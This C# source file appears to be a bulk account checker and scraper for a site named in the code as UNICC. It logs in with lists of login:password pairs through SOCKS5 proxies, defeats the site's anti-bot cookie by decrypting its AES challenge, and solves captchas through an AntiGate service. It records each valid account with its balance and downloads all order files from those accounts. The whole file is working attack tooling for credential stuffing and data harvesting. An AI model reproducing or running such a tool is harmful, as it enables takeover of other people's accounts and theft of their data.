using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net;
using System.Security.Cryptography;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading.Tasks;
using xNet;

namespace UNICC_Parser
{
	public class Parser
	{
		private static readonly object locker = new object();
		private readonly xNet.HttpRequest request;

		private string domain { get; set; }
		private string Login { get; }
		private string Password { get; }
		private string ProxyLogin { get; }
		private string ProxyPassword { get; }
		private Form1 OwnerForm1 { get; }

		private static readonly Random r = new Random();
		private readonly CookieDictionary cookies;
		private DateTime DateFrom { get; }
		private string ResultsFolder { get; }
		public Parser(string _login, string _password, string _proxyLogin, string _proxyPassword, DateTime dt, string folder, Form1 form1)
		{
			Login = _login;
			Password = _password;
			ProxyLogin = _proxyLogin;
			ProxyPassword = _proxyPassword;
			OwnerForm1 = form1;
			domain = OwnerForm1.domain;
			DateFrom = dt;
			ResultsFolder = folder;
			request = new xNet.HttpRequest(domain)
			{
				KeepAliveTimeout = 15000,
				MaximumKeepAliveRequests = 10,
				EnableEncodingContent = true,
			};
			request.AddHeader("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8");
			request.AddHeader("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36");
			request.AddHeader("Accept-Language", "ru-RU,ru;q=0.8,en-US;q=0.6,en;q=0.4,zh-CN;q=0.2,zh;q=0.2,sv;q=0.2,zh-TW;q=0.2,es;q=0.2,de;q=0.2,nl;q=0.2");
			cookies = new CookieDictionary();
			request.Cookies = cookies;
		}

		private static void AppendLog(string log)
		{
			lock (locker)
			{
				File.AppendAllText("logs.txt", log + Environment.NewLine);
			}
		}
		public static byte[] StringToByteArray(string hex)
		{
			return Enumerable.Range(0, hex.Length)
							 .Where(x => x % 2 == 0)
							 .Select(x => Convert.ToByte(hex.Substring(x, 2), 16))
							 .ToArray();
		}
		public static string ByteArrayToString(byte[] ba)
		{
			StringBuilder hex = new StringBuilder(ba.Length * 2);
			foreach (byte b in ba)
				hex.AppendFormat("{0:x2}", b);
			return hex.ToString();
		}
		static string Decrypt(string a, string b, string c)
		{
			try
			{
				string plaintext = null;
				byte[] Key = StringToByteArray(a);
				byte[] IV = StringToByteArray(b);
				byte[] cipherText = StringToByteArray(c);

				using (AesManaged aes = new System.Security.Cryptography.AesManaged())
				{
					aes.Padding = PaddingMode.None;
					ICryptoTransform decryptor = aes.CreateDecryptor(Key, IV);
					using (MemoryStream ms = new MemoryStream(cipherText))
					{
						using (CryptoStream cs = new CryptoStream(ms, decryptor, CryptoStreamMode.Read))
						{
							using (BinaryReader reader = new BinaryReader(cs))
							{
								byte[] bts = reader.ReadBytes(16);
								plaintext = ByteArrayToString(bts);
							}
						}
					}
				}
				return plaintext;
			}
			catch (Exception ex)
			{
				return "";
			}
		}
		public void Run()
		{
			try
			{
				int count = 0;
				while (count++ != 3)
				{
					AppendLog($"Start parsing account {Login}:{ProxyLogin}. Attempt №{count}");
#if !DEBUG
					request.Proxy = ProxyClient.Parse(ProxyType.Socks5, $"{ProxyLogin}:{ProxyPassword}");
#endif
					var result = SendGet(domain + "/");
					var ress = Regex.Matches(result, @"toNumbers\(""(.+?)""\)").Cast<Match>().Select(t => t.Groups[1].Value).ToArray();
					//var javascriptCookie = SendGet($"https://vh415782.eurodir.ru/app/test.php?a={ress[0]}&b={ress[1]}&c={ress[2]}").Trim();
					var javascriptCookie = Decrypt(ress[0], ress[1], ress[2]);
					var expire = Regex.Match(result, @"expires=(.+?);").Value;
					cookies.Add("PTCOOK", $"{javascriptCookie}; {expire} path=/");
					result = SendGet(domain + "/?protected=1");
					AppendLog($"{Login}: Get page");
					var key = Regex.Match(result, "var ghsdfkjlkhhealk35bbr = \"(.*)\";", RegexOptions.Singleline).Groups[1].Value;
					AppendLog($"{Login}: Got cookie key");
					result = SendGet(domain + "/home/captcha/refresh/1/").Replace("\\", "");
					AppendLog($"{Login}: Refresh to get captcha");
					var captchaPath = Regex.Match(result, ":\"(.*)\"").Groups[1].Value;
					var captchaURL = domain + captchaPath;
					AppendLog($"{Login}: Got captcha");
					var imageBytes = Download(captchaURL);
					var captchaAnswer = AntiGate.Recognize(imageBytes);
#if DEBUG

					int rand = r.Next(0, 50000000);
					File.WriteAllBytes($"file{rand}.png", imageBytes); //Test
					captchaAnswer = File.ReadAllText("answer.txt");
#endif
					AppendLog($"{Login}: Recognized captcha");
					RequestParams parameters = new RequestParams
					{
						new KeyValuePair<string, string>("LoginForm[username]", Login),
						new KeyValuePair<string, string>("LoginForm[password]", Password),
						new KeyValuePair<string, string>("LoginForm[captcha]", captchaAnswer),
						new KeyValuePair<string, string>("ghsdfkjlkhhealk35bbr", key)
					};
					result = SendPost(domain + "/?protected=1", parameters);
					if (result.Contains("The verification code is incorrect."))
					{
						AppendLog($"{Login}: Wrong captcha");
						continue;
					}
					if (result.Contains("Incorrect username or password."))
					{
						AppendLog($"{Login}: Wrong username or password");
						OwnerForm1.AddFailedAccount($"{Login}:{Password}{Environment.NewLine}");
						break;
					}
					AppendLog($"{Login}: Success login");
					var balance_str = Regex.Match(result, "id=\"balance_block\">([\\d.]*)").Groups[1].Value;
					if (string.IsNullOrWhiteSpace(balance_str.Trim()))
					{
						AppendLog($"{Login}: Could not determine balance");
						break;
					}
					var balance = Regex.Match(result, "id=\"balance_block\">([\\d.]*)").Groups[1].Value + "$";
					DownloadFiles(cookies, key, parameters);
					OwnerForm1.AddSuccessAccount($"{Login}:{Password}|{balance}{Environment.NewLine}");
					break;
				}
			}
			catch (Exception ex)
			{
				OwnerForm1.AddFailedAccount($"{Login}:{Password}{Environment.NewLine}");
				AppendLog($"{Login} got exception {ex.Message}");
			}
		}

		private void DownloadFiles(CookieDictionary dict, string key, RequestParams parameters)
		{
			int pagescount = 1;
			List<string> files = new List<string>();
			for (int i = 1; i <= pagescount; i++)
			{
				string file = SendGet(domain + $"/orders/index/Operations_page/{i}/?ajax=orders-grid");
				if (i == 1)
				{
					var regex = Regex.Match(file, "<div class=\"summary\">(.*) of (\\d*) results.<\\/div>");
					pagescount = (int)Math.Ceiling(Convert.ToInt32(regex.Groups[2].Value) / 25.0);
				}
				string pattern = @"<input value=""(\d*)"" id=""OrderID_\d*"" type=""checkbox"" name=""OrderID\[]"" \/><\/td><td>\d*<\/td><td>(.{19})<\/td>";
				var matches = Regex.Matches(file, pattern);
				parameters = new RequestParams
					{
						new KeyValuePair<string, string>("ghsdfkjlkhhealk35bbr", key),
						new KeyValuePair<string, string>("Operations[download_format]","1"),
						new KeyValuePair<string, string>("Download","")
					};
				for (int z = 0; z < matches.Count; z++)
				{
					var id = matches[z].Groups[1].Value;
					var date = DateTime.Parse(matches[z].Groups[2].Value);
					if (DateFrom == default(DateTime) || date >= DateFrom)
					{
						parameters.Add(new KeyValuePair<string, string>("OrderID[]", id));
					}
				}
				if (parameters.Count == 3)
				{
					break;
				}
				file = SendPost(domain + "/orders/download/", parameters);
				File.WriteAllText(ResultsFolder + $"\\{Login}-{i}.txt", file);
				files.Add(file);
			}
			AppendLog($"{Login}: Finished downloading files");
			OwnerForm1.IncrementFilesCount(files);
		}

		public string SendPost(string url, RequestParams p)
		{
			string result = string.Empty;
			try
			{
				var httpWebResponse = request.Post(url, p);
				return httpWebResponse.ToString();
			}
			catch (WebException ex)
			{
				if (ex.Status == WebExceptionStatus.ProtocolError)
				{
					using (StreamReader streamReader2 = new StreamReader(ex.Response.GetResponseStream()))
					{
						result = streamReader2.ReadToEnd();
					}
				}
				return result;
			}
		}

		public string SendGet(string url)
		{
			string empty = string.Empty;
			try
			{
				var httpWebResponse = request.Get(url);
				StreamReader streamReader = new StreamReader(httpWebResponse.ToMemoryStream(), Encoding.GetEncoding(1251));
				empty = streamReader.ReadToEnd();
				streamReader.Close();
				return empty;
			}
			catch (Exception ex)
			{
				empty = ex.Message;
				return empty;
			}
		}

		public byte[] Download(string url)
		{
			string empty = string.Empty;
			try
			{
				var httpWebResponse = request.Get(url);
				return httpWebResponse.ToMemoryStream().ToArray();
			}
			catch (Exception ex)
			{
				empty = ex.Message;
				return null;
			}
		}
	}

}
